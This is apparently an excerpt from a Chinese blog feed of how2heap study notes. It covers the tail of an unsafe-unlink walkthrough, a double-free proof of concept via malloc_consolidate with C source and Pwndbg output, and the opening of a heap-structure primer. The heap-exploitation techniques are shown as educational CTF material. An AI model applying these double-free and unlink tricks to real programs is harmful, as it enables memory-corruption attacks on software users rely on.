class="number">0x603100</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603110</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603120</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020ee1</span></span><br><span class="line">这样，我们去free chunk1，这个时候系统会检测到 fake chunk是释放状态，会触发 unlink ，fake chunk会向后合并， chunk0会被吞并。</span><br><span class="line"></span><br><span class="line">unlink 的操作如下：</span><br><span class="line"></span><br><span class="line">FD = P-&gt;fd;</span><br><span class="line">BK = P-&gt;bk;</span><br><span class="line">FD-&gt;bk = BK</span><br><span class="line">BK-&gt;fd = FD</span><br><span class="line">根据 fd 和 bk 指针在 malloc_chunk 结构体中的位置，这段代码等价于：</span><br><span class="line"></span><br><span class="line">FD = P-&gt;fd = &amp;P - 24</span><br><span class="line">BK = P-&gt;bk = &amp;P - 16</span><br><span class="line">FD-&gt;bk = *(&amp;P - 24 + 24) = P</span><br><span class="line">BK-&gt;fd = *(&amp;P - 16 + 16) = P</span><br><span class="line">这样就通过了 unlink 的检查，最终效果为：</span><br><span class="line"></span><br><span class="line">FD-&gt;bk = P = BK = &amp;P - 16</span><br><span class="line">BK-&gt;fd = P = FD = &amp;P - 24</span><br><span class="line">最后原本指向堆上 fake chunk 的指针 P 指向了自身地址减 <span class="number">24</span> 的位置,这就意味着如果我们能对堆P进行写入，则就有了任意内存写。如果我们能对堆P进行读取，则就有了信息泄露。</span><br><span class="line"></span><br><span class="line">在这个例子中，最后chunk0_ptr 和chunk0_ptr[<span class="number">3</span>] 指向的地方是一样的。相对我们如果对chunk0_ptr[<span class="number">3</span>]修改，也是对chunk0_ptr进行了修改。</span><br><span class="line"></span><br><span class="line">在程序中，程序先对chunk0_ptr[<span class="number">3</span>]进行了修改，让它指向了victim_string 字符串的指针。</span><br><span class="line"></span><br><span class="line"><span class="number">50</span>   strcpy(victim_string,<span class="string">"Hello!~"</span>);</span><br><span class="line"> ► <span class="number">51</span>   chunk0_ptr[<span class="number">3</span>] = (uint64_t) victim_string;</span><br><span class="line">（如果这个地址是 got 表地址，我们紧接着就可以 进行 劫持 got 的操作。）</span><br><span class="line"></span><br><span class="line">Pwndbg&gt; x/<span class="number">40</span>gx <span class="number">0x603000</span></span><br><span class="line"><span class="number">0x603000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x603010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603020</span>:   <span class="number">0x0000000000602058</span>  <span class="number">0x00007fffffffe3d0</span></span><br><span class="line"><span class="number">0x603030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603090</span>:   <span class="number">0x0000000000000080</span>  <span class="number">0x0000000000000090</span></span><br><span class="line"><span class="number">0x6030a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030b0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030c0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030d0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030e0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030f0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603100</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603110</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603120</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020ee1</span></span><br><span class="line"><span class="number">0x603130</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line">Pwndbg&gt; p chunk0_ptr</span><br><span class="line">$<span class="number">8</span> = (uint64_t *) <span class="number">0x603010</span></span><br><span class="line">然后我们对chunk0_ptr 进行操作，就能得到一个地址写。</span><br><span class="line"></span><br><span class="line">Pwndbg&gt; x/<span class="number">40</span>gx <span class="number">0x603000</span></span><br><span class="line"><span class="number">0x603000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x603010</span>:   <span class="number">0x4141414142424242</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603020</span>:   <span class="number">0x0000000000602058</span>  <span class="number">0x00007fffffffe3d0</span></span><br><span class="line"><span class="number">0x603030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603090</span>:   <span class="number">0x0000000000000080</span>  <span class="number">0x0000000000000090</span></span><br><span class="line"><span class="number">0x6030a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030b0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030c0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030d0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030e0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030f0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603100</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603110</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603120</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020ee1</span></span><br><span class="line"><span class="number">0x603130</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line">Pwndbg&gt; x/gx chunk0_ptr</span><br><span class="line"><span class="number">0x603010</span>:   <span class="number">0x4141414142424242</span></span><br><span class="line">Pwndbg&gt;</span><br><span class="line">总结下，如果我们找到一个全局指针，通过unlink的手段，我们就构造一个chunk指向这个指针所指向的位置，然后通过对chunk的操作来进行读写操作。</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;unlink&lt;/p&gt;
&lt;p&gt;利用损坏的块自由地获取任意写入。&lt;/p&gt;
&lt;p&gt;利用free改写全局指针chunk0_ptr达到任意内存写的目的，即不安全取消链接。&lt;/p&gt;
&lt;h3 id=&quot;0x01源代码&quot;&gt;&lt;a href=&quot;#0x01源代码&quot; class=&quot;headerlin
      
    
    </summary>
    
      <category term="how2heap" scheme="http://yoursite.com/categories/how2heap/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>fastbin_dup_consolidate</title>
    <link href="http://yoursite.com/2019/08/09/fastbin_dup_consolidate/"/>
    <id>http://yoursite.com/2019/08/09/fastbin_dup_consolidate/</id>
    <published>2019-08-09T06:50:35.298Z</published>
    <updated>2019-08-09T11:23:57.153Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-Double-free绕过机制"><a href="#0x01-Double-free绕过机制" class="headerlink" title="0x01 Double free绕过机制"></a>0x01 Double free绕过机制</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">我们上一条 <span class="number">0x02</span> 介绍了一个 fast double free 的绕过机制，通过在free 同一个 chunk中的中间插入对另外一个chunk 的free。</span><br><span class="line">free(p1);</span><br><span class="line">free(p2);</span><br><span class="line">free(p1);</span><br></pre></td></tr></table></figure><h3 id="0x02-源代码"><a href="#0x02-源代码" class="headerlink" title="0x02 源代码"></a>0x02 源代码</h3><p>结合堆入坑指南看更好理解</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">void</span>* p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated two fastbins: p1=%p p2=%p\n"</span>, p1, p2);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now free p1!\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated large bin to trigger malloc_consolidate(): p3=%p\n"</span>, p3);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"In malloc_consolidate(), p1 is moved to the unsorted bin.\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Trigger the double free vulnerability!\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We can pass the check in malloc() since p1 is not fast top.\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x03-代码分析"><a href="#0x03-代码分析" class="headerlink" title="0x03 代码分析"></a>0x03 代码分析</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"> 编译后 gdb运行</span><br><span class="line"> 首先是两个malloc</span><br><span class="line"> ![](https://xzfile.aliyuncs.com/media/upload/picture/<span class="number">20180816002014</span><span class="number">-1718</span>ab98-a0a7<span class="number">-1.</span>png)</span><br><span class="line"> Pwndbg&gt; heap</span><br><span class="line">Top Chunk: <span class="number">0x6020a0</span></span><br><span class="line">Last Remainder: <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x602000</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>, <span class="comment">###只有在前面一个堆块是空闲的时候才有值，用来只是前一个堆块的大小。前面一个堆块在使用时他的值始终为0</span></span><br><span class="line">  size = <span class="number">0x51</span>, <span class="comment">### 用来指示当前堆块的大小的(头部加上user data的大小)</span></span><br><span class="line">  fd = <span class="number">0x0</span>,</span><br><span class="line">  bk = <span class="number">0x0</span>,</span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x602050</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>,</span><br><span class="line">  size = <span class="number">0x51</span>,</span><br><span class="line">  fd = <span class="number">0x0</span>,</span><br><span class="line">  bk = <span class="number">0x0</span>,</span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x6020a0</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>,</span><br><span class="line">  size = <span class="number">0x20f61</span>,</span><br><span class="line">  fd = <span class="number">0x0</span>,</span><br><span class="line">  bk = <span class="number">0x0</span>,</span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">然后释放 p1,将它加入到 astbins中 <span class="comment">###堆入坑指南有详细介绍</span></span><br><span class="line">Pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x602000</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">当我们在中插入 malloc(<span class="number">0x400</span>) 创建一个 large bins的时候</span><br><span class="line">large bins</span><br><span class="line">chunk 的指针数组, 每个元素是一条 双向循环链表的头部, 但同一条链表中块的大小不一 定相同, 按照从大到小的顺序排列, 每个 bin 保存一定 大小范围的块。主要保存大小 <span class="number">1024</span> 字节以上的块。</span><br><span class="line"></span><br><span class="line">Pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">Pwndbg&gt; small bins</span><br><span class="line">No symbol <span class="string">"bins"</span> <span class="keyword">in</span> current context.</span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x7ffff7dd1b68</span> (main_arena+<span class="number">104</span>) ◂— <span class="number">0x7ffff7dd1b68</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">120</span>) ◂— <span class="number">0x7ffff7dd1b78</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x7ffff7dd1b88</span> (main_arena+<span class="number">136</span>) ◂— <span class="number">0x7ffff7dd1b88</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x602000</span> —▸ <span class="number">0x7ffff7dd1b98</span> (main_arena+<span class="number">152</span>) ◂— <span class="number">0x602000</span></span><br><span class="line"></span><br><span class="line">我们会发现 原本在 fastbins 的 chunk p1 跑到了 small bins 里。而且 chunk p2 的prev_size 和size字段都被修改了</span><br><span class="line"></span><br><span class="line">Pwndbg&gt; heap</span><br><span class="line">Top Chunk: <span class="number">0x6024b0</span></span><br><span class="line">Last Remainder: <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x602000</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>,</span><br><span class="line">  size = <span class="number">0x51</span>,</span><br><span class="line">  fd = <span class="number">0x7ffff7dd1b98</span> &lt;main_arena+<span class="number">152</span>&gt;,</span><br><span class="line">  bk = <span class="number">0x7ffff7dd1b98</span> &lt;main_arena+<span class="number">152</span>&gt;,</span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x602050</span> &#123;</span><br><span class="line">  prev_size = <span class="number">0x50</span>, <span class="comment">### 说明前一块是空闲的</span></span><br><span class="line">  size = <span class="number">0x50</span>,</span><br><span class="line">  fd = <span class="number">0x0</span>,</span><br><span class="line">  bk = <span class="number">0x0</span>,</span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x6020a0</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>,</span><br><span class="line">  size = <span class="number">0x411</span>,</span><br><span class="line">  fd = <span class="number">0x0</span>,</span><br><span class="line">  bk = <span class="number">0x0</span>,</span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x6024b0</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>,</span><br><span class="line">  size = <span class="number">0x20b51</span>,</span><br><span class="line">  fd = <span class="number">0x0</span>,</span><br><span class="line">  bk = <span class="number">0x0</span>,</span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">我们可以看看 large bin的分配</span><br><span class="line">/*</span><br><span class="line">     If this <span class="keyword">is</span> a large request, consolidate fastbins before continuing.</span><br><span class="line">     While it might look excessive to kill all fastbins before</span><br><span class="line">     even seeing <span class="keyword">if</span> there <span class="keyword">is</span> space available, this avoids</span><br><span class="line">     fragmentation problems normally associated <span class="keyword">with</span> fastbins.</span><br><span class="line">     Also, <span class="keyword">in</span> practice, programs tend to have runs of either small <span class="keyword">or</span></span><br><span class="line">     large requests, but less often mixtures, so consolidation <span class="keyword">is</span> <span class="keyword">not</span></span><br><span class="line">     invoked all that often <span class="keyword">in</span> most programs. And the programs that</span><br><span class="line">     it <span class="keyword">is</span> called frequently <span class="keyword">in</span> otherwise tend to fragment.</span><br><span class="line">   */</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">当分配 large chunk 时，首先根据 chunk 的大小获得对应的 large bin 的 index，接着判断当前分配区的 fast bins 中是否包含 chunk，如果有，调用 malloc_consolidate() 函数合并 fast bins 中的 chunk，并将这些空闲 chunk 加入 unsorted bin 中。因为这里分配的是一个 large chunk，所以 unsorted bin 中的 chunk 按照大小被放回 small bins 或 large bins 中。这个时候我们就可以再次释放 p1</span><br><span class="line"></span><br><span class="line">Pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x602000</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">Pwndbg&gt; smallbins</span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x7ffff7dd1b68</span> (main_arena+<span class="number">104</span>) ◂— <span class="number">0x7ffff7dd1b68</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">120</span>) ◂— <span class="number">0x7ffff7dd1b78</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x7ffff7dd1b88</span> (main_arena+<span class="number">136</span>) ◂— <span class="number">0x7ffff7dd1b88</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x602000</span> ◂— <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">这个时候，我们既有fastbins中的 chunk p1 也有small bins 的chunk p2。我们可以malloc两次，第一次从fastbins取出，第二次从small bins中取出。且这两块新 chunk 处于同一个位置。</span><br></pre></td></tr></table></figure><h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Allocated two fastbins: p1=<span class="number">0x220a010</span> p2=<span class="number">0x220a060</span></span><br><span class="line">Now free p1!</span><br><span class="line">Allocated large bin to trigger malloc_consolidate(): p3=<span class="number">0x220a0b0</span></span><br><span class="line">In malloc_consolidate(), p1 <span class="keyword">is</span> moved to the unsorted bin.</span><br><span class="line">Trigger the double free vulnerability!</span><br><span class="line">We can <span class="keyword">pass</span> the check <span class="keyword">in</span> malloc() since p1 <span class="keyword">is</span> <span class="keyword">not</span> fast top.</span><br><span class="line">Now p1 <span class="keyword">is</span> <span class="keyword">in</span> unsorted bin <span class="keyword">and</span> fast bin. So we<span class="string">'will get it twice: 0x220a010 0x220a010</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-Double-free绕过机制&quot;&gt;&lt;a href=&quot;#0x01-Double-free绕过机制&quot; class=&quot;headerlink&quot; title=&quot;0x01 Double free绕过机制&quot;&gt;&lt;/a&gt;0x01 Double free绕过机制&lt;/h3&gt;&lt;
      
    
    </summary>
    
      <category term="how2heap" scheme="http://yoursite.com/categories/how2heap/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>堆入坑指南</title>
    <link href="http://yoursite.com/2019/08/08/%E5%A0%86%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97/"/>
    <id>http://yoursite.com/2019/08/08/堆入坑指南/</id>
    <published>2019-08-08T13:48:01.874Z</published>
    <updated>2019-08-09T06:55:05.729Z</updated>
    
    <content type="html"><![CDATA[<p>原文借鉴：<a href="https://www.anquanke.com/post/id/163971" target="_blank" rel="noopener">https://www.anquanke.com/post/id/163971</a></p><h3 id="0x01什么是堆"><a href="#0x01什么是堆" class="headerlink" title="0x01什么是堆"></a>0x01什么是堆</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">首先先明确一下堆的概念，堆不同于栈，堆是动态分配的（由操作系统内核或者堆管理器），只有在程序中需要时才会分配。在 CTF 的 pwn 程序中，栈是程序加载进内存后就会出现，而堆是由 malloc、alloc、realloc 函数分配内存后才会出现。</span><br><span class="line">windows 和 linux 下的堆分配、管理方式都不同，这里主要讲到的是 CTF 中常出现的 linux 下的堆分配知识</span><br><span class="line">先看看堆在虚拟内存中的位置</span><br><span class="line">堆的生长方向是从低地址向高地址生长的，而栈是从高地址向低地址生长的。</span><br><span class="line">实际上堆可以申请到的内存空间比栈要大很多，在 linux 的 4G 的虚拟内存空间里最高可以达到 2.9 G 的空间</span><br><span class="line"></span><br><span class="line">对堆操作的是由堆管理器（ptmalloc2）来实现的，而不是操作系统内核。因为程序每次申请或者释放堆时都需要进行系统调用，系统调用的开销巨大，当频繁进行堆操作时，就会严重影响程序的性能</span><br></pre></td></tr></table></figure><h3 id="0x02堆的基本结构"><a href="#0x02堆的基本结构" class="headerlink" title="0x02堆的基本结构"></a>0x02堆的基本结构</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.pre size字段。只有在前面一个堆块是空闲的时候才有值，用来只是前一个堆块的大小。前面一个堆块在使用时他的值始终为0</span><br><span class="line">2.size字段，用来指示当前堆块的大小的(头部加上user data的大小)。但是这个字段的最后三位相当于三个flag，有另外的作用</span><br><span class="line">1.NON_MAIN_ARENA     这个堆块是否位于主线程</span><br><span class="line">2.IS_MAPPED          记录当前 chunk 是否是由 mmap 分配的</span><br><span class="line">3.PREV_INUSE         记录前一个 chunk 块是否被分配</span><br><span class="line"></span><br><span class="line">这里重点讲解最后一位：用来记录前一个 chunk 块是否被分配，被分配的话这个字段的值为 1，所以经常会在已分配的堆块中的 size 字段中发现值比原来大 1 个字节。</span><br><span class="line">所以前一个堆块的释放与否都和这两个字段（pre_size、size）的值有关，这是因为便于内存的释放操作（free）</span><br><span class="line">4.user data 顾名思义就是用来存放用户数据的。</span><br><span 